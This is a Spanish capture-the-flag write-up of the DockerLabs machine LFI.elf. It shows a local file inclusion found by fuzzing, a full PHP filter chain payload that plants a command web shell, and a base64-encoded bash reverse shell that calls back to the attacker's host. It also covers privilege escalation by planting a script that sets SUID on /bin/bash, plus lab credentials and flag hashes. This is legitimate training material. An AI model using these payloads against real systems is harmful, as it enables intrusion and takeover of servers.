---
title: "LFI.elf - DockerLabs"
date: 2026-03-05
author: "Joel Morillas Pagan (Ghxstsec)"
description: "Resolución paso a paso de la máquina LFI.elf de DockerLabs. Explotación de Local File Inclusion."
tags: ["DockerLabs", "LFI", "CTF"]
showFullContent: false
---

Write-up Máquina LFI.elf de DockerLabs
======================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9OmGubnfOloCL3s9ymnLEw.png)

Por aquí tenéis mi write-up para la máquina lfi.elf de la plataforma dockerlabs.es

¡Una vez estando la máquina deployeada, comenzamos!

![captionless image](https://miro.medium.com/v2/resize:fit:1152/format:webp/1*uMvGLrPB2OTDGkqN-pZbrw.png)

**ENUMERACION INICIAL**
-----------------------

Como siempre, comenzamos con el escaneo con nmap, yo uso este comando

```
nmap -p- -Pn -n -sCV -min-rate 5000 -T5 -oN targeted -v 172.17.0.2
```

Nos tira esto:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ta4vJZQQ238MrQt2HO7zBw.png)

Así que asumimos que va a ser hacking web, vamos a ver la web

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VsBPapTjGZmllaeB3PvlMw.png)![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ShZ8AlE2JbqP7GIOIqDJOg.png)![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZIbnWFFMvcm9eiDR-3CbgA.png)

Así que doy por hecho que va a haber algún tipo de archivo escondido, posiblemente en el root directory de la web, así que enumeramos con gobuster

```
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists-master/Discovery/Web-Content/common.txt -x php,html,txt,svg
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1sNxelRoiJd4k7WF9w5xEQ.png)

Recuerdo que, si no veis este archivo es porque os habréis olvidado de indicarle las extensiones de los archivos a gobuster, cuidado con eso

el contenido de secret.txt es este:


```
agent lin,
I have encrypted this message so that you can see it alone, 
I need you to help me with a super secret mission, 
but I can't tell you the credentials yet, 
you will have to see them yourself, 
prepare something inside the page so that you can see them easily you just have to search more.
Good luck agent lin.
```

Esto está muy visto la verdad, asumo que será en algún parámetro de PHP, vamos a empezar por el principio, vamos a enumerar el primer directorio (index.php) en busca de parámetros con gobuster

```
gobuster fuzz -u http://172.17.0.2/index.php?FUZZ=../../../../../../etc/passwd -w /usr/share/SecLists-master/Discovery/Web-Content/common.txt --exclude-length 978
```

y nos da este resultado:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://172.17.0.2/index.php?FUZZ=../../../../../../etc/passwd
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/SecLists-master/Discovery/Web-Content/common.txt
[+] Exclude Length:   978
[+] User Agent:       gobuster/3.6
[+] Timeout:          10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
Found: [Status=400] [Length=302] [Word=Documents and Settings] http://172.17.0.2/index.php?Documents and Settings=../../../../../../etc/passwd
Found: [Status=400] [Length=302] [Word=Program Files] http://172.17.0.2/index.php?Program Files=../../../../../../etc/passwd
Found: [Status=400] [Length=302] [Word=reports list] http://172.17.0.2/index.php?reports list=../../../../../../etc/passwd
** Found: [Status=200] [Length=1257] [Word=search] http://172.17.0.2/index.php?search=../../../../../../etc/passwd **
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================
```

Ahí podemos ver un parámetro en estado 200, así que vamos a revisar el /etc/passwd

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MJq27mUsufyAb35iqQTa7g.png)

**INTRUSIÓN INICIAL**
---------------------

tenemos LFI, recordé que no había ningún tipo de inicio de sesión tipo SSH en la máquina víctima, así que tendremos que sacar una reverse Shell, desde aquí, sabemos que usa PHP, así que optaremos por los **PHP Filter Chain**, generando un parámetro cmd.

[GitHub - synacktiv/php_filter_chain_generator
------------------------------------------------

### Contribute to synacktiv/php_filter_chain_generator development by creating an account on GitHub.

github.com](https://github.com/synacktiv/php_filter_chain_generator?source=post_page-----f68e4c44e21f---------------------------------------)

Una vez descargado el script, usaré este comando

```
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
```

nos devolverá algo así:

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Así que creamos la URL de ataque:

```
http://172.17.0.2/index.php?search=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=id
```

el cambio que hemos aplicado en el payload es añadir un Ampersand (&) al final, para llamar al parámetro “cmd” y ejecutar comandos en la máquina víctima, y podremos ver esto:

![captionless image](https://miro.medium.com/v2/resize:fit:1110/format:webp/1*qEyHWZQJ5FfU-S1UYq5IoA.png)

Así que añadiremos un comando que nos dé una reverse Shell en nuestra máquina local, yo hago el típico comando de una cadena de base64 con el reverse Shell en bash, lo decodeo en el mismo comando, y lo ejecuto en el mismo comando, algo así:

```
Codigo original: /bin/bash -i >& /dev/tcp/172.17.0.1/9001 0>&1
Encodeado: L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvOTAwMSAwPiYx
```

Entonces, en la URL quedaría algo así:

```
............|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvOTAwMSAwPiYx'|base64 -d|bash
```

nos abriremos un listener con nuestro Shell handler preferido en nuestra máquina:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rI_meZvgzppg54pGw7mZ9w.png)

¿Os acordáis del mensaje de secret.txt? Pues vamos a enumerar muy bien los directorios web de la máquina víctima:

### **WWW-DATA → LIN**

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dDTIF_SfCfiWKs2OLc0RPA.png)

Y ahí estaría las credenciales para el usuario Lin

iniciamos sesión:

```
su lin
Password: agentelinsecreto
bash-5.2$ whoami
lin
```

### **LIN → ROOT**

okay, vamos a enumerar el directorio **/home/lin**

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*94KFMl_YCmA-E6L1NofiAg.png)```
```
cat user.txt
ed87c5c288f4909dde74cd499acbce92
```

Bueno, podemos ver que el script sistem.py se ejecuta como root, y no podemos editarlo, así que tenemos que tirar de analizar el script, podemos ver que usa una librería extraña, llamada subtthreads, vamos a analizar en un caso de **Library Path Hijacking**

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g8UD4fYj9qyqpAmpHnkAMQ.png)

Bueno, no es **Library Path Hijacking**, pero podemos ver que cada vez que se ejecuta esta librería, por ejemplo en el script **sistem.py,** se intenta ejecutar el script ubicado en **/tmp/script.sh**, actualmente no existe ningún script en esa ubicación, así que lo creamos nosotros, como se ejecuta como sudo, **vamos a cambiar los permisos del binario /bin/bash**

![captionless image](https://miro.medium.com/v2/resize:fit:786/format:webp/1*HIqjtC-SrY89rOUt-vIiIQ.png)

```
el contenido de script.sh es:
#!/bin/bash
chmod u+s /bin/bash
```

Así que procedemos con la posible escalada, ejecutando el script “**sistem.py**”, _recordar darle permisos de ejecución a /tmp/script.sh_

```
bash-5.2$ cd /home/lin
bash-5.2$ ls
sistem.py  user.txt
bash-5.2$ python3 sistem.py
[MENU] Elija una opción:
  1. Mostrar información del sistema
  2. Realizar tarea
  3. Ejecutar módulo subthreads
  4. Salir
  Opción: 3
[MENU] Elija una opción:
  1. Mostrar información del sistema
  2. Realizar tarea
  3. Ejecutar módulo subthreads
  4. Salir
  Opción: 4
Saliendo...
bash-5.2$ 
```

Una vez hecho esto, iniciaremos una bash con este comando

```
/bin/bash -p
```![captionless image](https://miro.medium.com/v2/resize:fit:1244/format:webp/1*V09f2d84SPb-mIm0GdOYIA.png)```
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
2d264e1f92a8230d442750d69fba4cc5
bash-5.2# 


Pues hasta ahí llegaría esta máquina, espero que os haya gustado, sé que hay más maneras de pwnear esta máquina, pero yo me decante por esta manera :)

Por si queréis conocerme un poco mas:

👋 Sobre el autor

¡Hola! Soy Ghxstsec, un entusiasta de la ciberseguridad y pentester. Me dedico a documentar mi viaje por el complejo mundo de la seguridad ofensiva.

Actualmente, poseo las certificaciones eJPTv2, eCPPTv3 y Google Cybersecurity Professional Certificate. Mi objetivo es intentar ayudar a sobrellevar la brecha entre el aprendizaje teórico y la práctica, al tiempo que comparto mis experiencias sinceras con la comunidad. Cuando no estoy en una maratón de exámenes de 24 horas, me puedes encontrar haciendo ejercicios en Try Hack Me o investigando los últimos artículos sobre ciberseguridad.

✉️ Conéctate conmigo:

LinkedIn: [LinkedIn](https://www.linkedin.com/in/joel-morillas-aka-ghxstsec-16a988260/)
GitHub: [GitHub](https://github.com/Ghxstsec)
Twitter/X: [Twitter](https://x.com/Louikizz)
Try Hack Me: [THM](https://tryhackme.com/p/Ghxstsec)

¡Muchas gracias por leer todo el artículo! ¡Te deseo mucha suerte en tus próximos logros! 😊
